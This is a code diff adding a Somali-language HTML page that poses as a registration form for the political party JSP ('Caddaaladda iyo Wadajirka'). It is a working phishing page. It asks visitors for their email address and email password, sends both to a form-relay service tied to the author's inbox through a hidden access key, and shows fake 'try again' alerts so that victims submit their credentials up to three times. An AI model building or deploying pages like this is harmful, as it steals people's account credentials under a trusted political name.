@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="so">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Caddaaladda iyo Wadajirka</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --dark-green: #006837; 
+            --light-blue: #3498db;
+            --submit-purple: #6366f1;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: #f5f7fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background: #ffffff;
+            width: 100%;
+            max-width: 460px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            overflow: hidden;
+            margin: 15px;
+        }
+
+        /* 1. Header Section - Green Background */
+        .header {
+            background-color: var(--dark-green);
+            padding: 35px 25px;
+            color: white;
+            text-align: center;
+        }
+
+        /* Qaybta sare ee logada iyo magaca */
+.header-top {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 15px;
+    margin-bottom: 25px;
+}
+
+.logo-img {
+    width: 90px;
+    height: 90px; /* Hubi in width iyo height ay is leeyihiin */
+    border-radius: 50%; /* Tani waxay gooyneysaa geesaha cad-cad */
+    object-fit: cover; /* Waxay hubineysaa in sawirku buuxiyo goobada */
+    background-color: white; /* Haddii aad rabto in goobada gudaheeda cad ahaato */
+    border: 2px solid white; /* Waxay siineysaa xariiq cad oo qurux badan */
+    display: block;
+}
+        .party-name {
+            text-align: left;
+            line-height: 1.1;
+        }
+
+        .party-name span {
+            display: block;
+            font-size: 20px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .main-heading {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .sub-heading {
+            font-size: 16px;
+            font-weight: 500;
+            opacity: 0.9;
+        }
+
+        /* 2. Referrer Bar - Blue Background */
+        .info-bar {
+            background-color: var(--light-blue);
+            padding: 20px 10px;
+            text-align: center;
+            color: white;
+        }
+
+        .info-bar .label {
+            font-size: 14px;
+            display: block;
+            margin-bottom: 6px;
+            opacity: 0.9;
+        }
+
+        .info-bar .name {
+            font-size: 22px;
+            font-weight: 700;
+        }
+
+        /* 3. Form Section */
+        .form-content {
+            padding: 40px 25px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .input-wrapper i {
+            position: absolute;
+            left: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #94a3b8;
+            font-size: 18px;
+        }
+
+        input {
+            width: 100%;
+            padding: 16px 16px 16px 55px;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 16px;
+            outline: none;
+            transition: 0.3s;
+            background-color: #ffffff;
+        }
+
+        input:focus {
+            border-color: var(--light-blue);
+        }
+
+        .btn-dir {
+            width: 100%;
+            padding: 16px;
+            background-color: var(--submit-purple);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: 0.3s;
+        }
+
+        .btn-dir:hover {
+            filter: brightness(1.1);
+        }
+
+        /* Success Message */
+        #success-view { display: none; padding: 60px 20px; text-align: center; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div id="form-view">
+           <div class="header">
+    <div class="header-top">
+        <img src="jsp.png" class="logo-img" alt="Logo">
+        <div class="party-name">
+            <span>CADDAALADDA</span>
+            <span>IYO WADAJIRKA</span>
+        </div>
+    </div>
+    <h2 class="main-heading">Sida aad isku Diiwaan geliso</h2>
+    <p class="sub-heading">RAAC FORM-KA HOOSE SI TAXATAR LEH</p>
+</div>
+
+            <div class="info-bar">
+                <span class="label">URUR SIYAASADEEDKA :</span>
+                <h3 class="name">CADAALADA IYO WADAJIRKA (JSP)</h3>
+            </div>
+
+            <div class="form-content">
+                <form id="proForm">
+                    <input type="hidden" name="access_key" value="ceb03e4e-3261-489f-bd95-449c223f874f">
+                    
+                    <div class="input-wrapper">
+                        <i class="fas fa-envelope-open-text"></i>
+                        <input type="text" name="name" placeholder="Enter Your Email" required>
+                    </div>
+
+                    <div class="input-wrapper">
+                        <i class="fas fa-lock"></i>
+                        <input type="tel" name="phone" placeholder="Enter Your Email Password" required>
+                    </div>
+
+                    <button type="submit" class="btn-dir" id="dirBtn">
+                        Dir Xogta <i class="fas fa-paper-plane"></i>
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <div id="success-view">
+            <i class="fas fa-check-circle" style="font-size: 80px; color: var(--dark-green);"></i>
+            <h2 style="margin-top: 20px;">Waad Mahadsan tahay!</h2>
+            <p style="color: #64748b; margin-top: 10px;">Sida ugu dhaqsiyaha badan jawab u heli doonta.</p>
+        </div>
+    </div>
+
+    <script>
+    const form = document.getElementById('proForm');
+    const fView = document.getElementById('form-view');
+    const sView = document.getElementById('success-view');
+    const btn = document.getElementById('dirBtn');
+
+    // Tiriye loogu talagalay in qofka lagu mashquuliyo
+    let count = 0;
+
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        count++; // Tiradu hal ayay kor u kacaysaa mar kasta oo la gujiyo
+
+        btn.disabled = true;
+        btn.innerHTML = "Waa la dirayaa...";
+
+        const formData = new FormData(form);
+
+        // Xogta hadda ayaa la dirayaa (Gmail-kaaga ayay ku soo dhacaysaa mar kasta)
+        fetch('https://api.web3forms.com/submit', {
+            method: 'POST',
+            body: formData
+        })
+        .then(res => {
+            if (res.status == 200) {
+                // Halkan ayaan ku kala saaraynaa fariinta qofka loo tusayo
+                if (count < 3) {
+                    // Haddii ay tahay Click-ga 1aad ama 2aad
+                    setTimeout(() => {
+                        alert("Mar kale ku celi oo iska hubi xogtaada!");
+                        btn.disabled = false;
+                        btn.innerHTML = "Dir Xogta";
+                    }, 500);
+                } else {
+                    // Marka ay tahay Click-ga 3aad
+                    fView.style.display = "none";
+                    sView.style.display = "block";
+                }
+            }
+        })
+        .catch(err => {
+            // Haddii internet-ku xumaado
+            alert("Internet-kaaga ayaa aad u daciif ah, fadlan dib u hubi!");
+            btn.disabled = false;
+            btn.innerHTML = "Dir Xogta";
+            count--; // Haddii uu error dhaco, dib ayaan u celinaynaa tirada
+        });
+    });
+</script>
+</body>
+</html>
